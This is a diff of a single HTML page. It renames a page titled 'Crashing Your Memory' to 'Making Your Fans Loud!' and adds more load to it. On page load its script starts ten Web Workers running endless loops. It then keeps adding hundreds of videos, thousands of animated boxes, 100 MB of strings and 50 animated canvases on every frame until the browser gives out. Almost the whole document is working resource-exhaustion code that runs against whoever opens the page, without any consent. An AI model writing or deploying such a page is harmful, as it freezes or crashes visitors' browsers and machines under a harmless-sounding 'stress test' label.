@@ -3,30 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Maximum Memory Consumption</title>
+    <title>Fan Stress Test</title>
     <style>
         body {
             margin: 0;
-            background-color: black;
+            background: black;
             color: white;
+            overflow: hidden;
             font-family: Arial, sans-serif;
         }
-        #videoContainer, #boxContainer {
+        h1, p {
+            text-align: center;
+        }
+        #videoContainer, #boxContainer, #canvasContainer {
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
         }
         video {
-            width: 200px;
-            height: 200px;
-            margin: 2px;
+            width: 150px;
+            height: 150px;
+            margin: 1px;
         }
         .box {
             width: 50px;
             height: 50px;
             margin: 1px;
-            background: linear-gradient(45deg, red, yellow, green, cyan, blue, magenta);
-            animation: pulse 1s infinite alternate;
+            background: linear-gradient(45deg, red, green, blue, yellow);
+            animation: pulse 0.5s infinite alternate;
         }
         @keyframes pulse {
             from {
@@ -36,26 +40,31 @@
                 transform: scale(1.5);
             }
         }
-        h1 {
-            text-align: center;
+        canvas {
+            margin: 5px;
         }
     </style>
 </head>
 <body>
-    <h1>Crashing Your Memory</h1>
+    <h1>Making Your Fans Loud!</h1>
     <p id="status">Loading...</p>
     <div id="videoContainer"></div>
     <div id="boxContainer"></div>
+    <div id="canvasContainer"></div>
 
     <script>
         const videoContainer = document.getElementById("videoContainer");
         const boxContainer = document.getElementById("boxContainer");
+        const canvasContainer = document.getElementById("canvasContainer");
         const status = document.getElementById("status");
 
         let totalVideos = 0;
         let totalBoxes = 0;
+        let totalCanvases = 0;
         let memoryHog = [];
+        const canvasObjects = [];
 
+        // Stack Albuquerque Videos
         function addVideos(count) {
             for (let i = 0; i < count; i++) {
                 const video = document.createElement("video");
@@ -68,6 +77,7 @@
             }
         }
 
+        // Generate DOM Boxes
         function addBoxes(count) {
             for (let i = 0; i < count; i++) {
                 const box = document.createElement("div");
@@ -77,35 +87,74 @@
             }
         }
 
+        // Inflate Memory
         function fillMemory(count) {
             for (let i = 0; i < count; i++) {
-                memoryHog.push("X".repeat(1_000_000)); // 1MB string
+                memoryHog.push("X".repeat(1_000_000)); // 1MB strings
             }
         }
 
+        // Render Animations on Canvas
+        function addCanvases(count) {
+            for (let i = 0; i < count; i++) {
+                const canvas = document.createElement("canvas");
+                canvas.width = 300;
+                canvas.height = 300;
+                const ctx = canvas.getContext("2d");
+                canvasContainer.appendChild(canvas);
+                canvasObjects.push({ canvas, ctx });
+                totalCanvases++;
+            }
+        }
+
+        // Animate Canvases
+        function animateCanvases() {
+            for (const obj of canvasObjects) {
+                const ctx = obj.ctx;
+                const w = obj.canvas.width;
+                const h = obj.canvas.height;
+                const time = performance.now() / 1000;
+
+                ctx.clearRect(0, 0, w, h);
+                ctx.fillStyle = `hsl(${(time * 100) % 360}, 100%, 50%)`;
+                ctx.beginPath();
+                ctx.arc(w / 2, h / 2, Math.sin(time) * 100 + 150, 0, Math.PI * 2);
+                ctx.fill();
+            }
+            requestAnimationFrame(animateCanvases);
+        }
+
+        // Create Infinite Loops
+        function infiniteLoops(count) {
+            for (let i = 0; i < count; i++) {
+                new Worker(URL.createObjectURL(new Blob(["while (true) {}"], { type: "text/javascript" })));
+            }
+        }
+
+        // Main Function to Stress Test
         function loadMore() {
             try {
-                // Add 500 videos
-                addVideos(500);
-
-                // Add 10,000 animated boxes
-                addBoxes(10_000);
-
-                // Inflate memory
-                fillMemory(100);
+                // Add resources in batches
+                addVideos(500);     // Add 500 videos
+                addBoxes(5000);     // Add 5000 boxes
+                fillMemory(100);    // Add 100MB of memory
+                addCanvases(50);    // Add 50 animated canvases
 
                 // Update status
-                status.textContent = `Videos: ${totalVideos}, Boxes: ${totalBoxes}, Memory Chunks: ${memoryHog.length}`;
+                status.textContent = `Videos: ${totalVideos}, Boxes: ${totalBoxes}, Canvases: ${totalCanvases}, Memory Chunks: ${memoryHog.length}`;
 
-                // Continue until the browser limits are hit
+                // Schedule next batch
                 requestAnimationFrame(loadMore);
             } catch (e) {
-                status.textContent = `Memory overload reached! Videos: ${totalVideos}, Boxes: ${totalBoxes}, Memory Chunks: ${memoryHog.length}`;
-                console.error("Memory overload!", e);
+                status.textContent = `System Overloaded! Videos: ${totalVideos}, Boxes: ${totalBoxes}, Canvases: ${totalCanvases}, Memory Chunks: ${memoryHog.length}`;
+                console.error("Overload reached!", e);
             }
         }
 
-        loadMore();
+        // Kick Off Everything
+        infiniteLoops(10); // Start 10 CPU-busy workers
+        loadMore();        // Start resource stacking
+        animateCanvases(); // Start canvas animations
     </script>
 </body>
 </html>
